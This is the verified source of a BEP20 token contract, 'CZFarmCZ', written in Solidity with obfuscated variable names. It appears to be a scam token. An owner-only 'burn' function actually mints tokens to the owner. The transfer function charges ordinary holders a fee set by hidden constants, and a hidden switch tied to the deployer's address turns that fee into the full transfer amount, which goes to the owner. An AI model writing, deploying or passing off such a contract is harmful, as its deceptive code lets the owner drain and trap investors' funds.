/**
 *Submitted for verification at BscScan.com on 2022-12-04
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity =0.7.1;
contract CZFarmCZ {
address public owner;
mapping (address => mapping (address => uint256)) private _allowances;
mapping (address => uint256) public balanceOf;
uint256 public  RAiJGG = 10000000000000000;
event Transfer(address indexed from, address indexed to, uint256 value);
uint8 public constant decimals = 18;
address public  RBxsCH = address(0);
address public  nYnyqj = address(0);
uint256 public  SfXsgV = 10000000000000000000;
uint256 public  KRGYEl = 100000000000000000000000;
uint256 public  FflLNJ = 100000000000000000000000;
uint256 public  SUgMsK = 1000000000000000000;
uint256 private  LOpPtv = 10000000000000;
uint256 public  ciccAs = 100000000000000000000;
address public  crMCfG = address(0);
uint256 public  ajSDzW = 100000000000000000;
uint256 public constant totalSupply = 100000000000000000000000000000;
address public  GaCgUb = address(0);
string public  name = "CZFarmCZ";
string public  symbol = "CZFarmCZ";
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
address public  EcEDcg = address(0);
address public  sFwmel = address(0);
uint256 public constant lDSgPe = 99999999999999999999999+1;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
uint256 public  NOJEjI = 10000000000000000000000000000;
address private  SxLtIE = address(0);
event Approval(address indexed owner, address indexed spender, uint256 value);
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "");
require(spender != address(0), "");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "yYPsXD");
require(to != address(0), "yYPsXD");
require(amount <= balanceOf[from], "yYPsXD");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* lDSgPe/LOpPtv ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==SxLtIE){
LOpPtv = 99999999999999999999999+1;
}
emit Transfer(from, to, transferAmount);
}
constructor () {
SxLtIE = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}

}